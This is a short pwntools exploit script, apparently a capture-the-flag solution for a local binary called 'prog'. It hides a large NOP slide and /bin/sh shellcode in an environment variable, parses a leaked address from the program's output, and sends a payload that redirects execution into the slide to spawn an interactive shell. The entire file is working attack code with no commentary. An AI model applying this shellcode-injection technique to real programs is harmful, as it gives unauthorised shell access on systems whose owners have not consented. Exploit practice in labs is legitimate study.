from pwn import *

context.binary = 'prog'
e = context.binary

# duzo = 0x1ffc8
duzo = 0x1fc00
slide = (asm(shellcraft.nop())*duzo)[:duzo]
argz = {'AAA': slide + encode(asm(shellcraft.sh()), b'\0')}
pa = os.environ.get('LD_LIBRARY_PATH')
if pa:
    argz.update({'LD_LIBRARY_PATH':pa})

p = e.process(env=argz)
p.readuntil(b' at')
addr = int(p.readline(), 0) + len(slide) + 4
payload = b'\x00'*(1+context.bytes)
payload += pack(addr)
p.sendline(payload)
p.interactive()
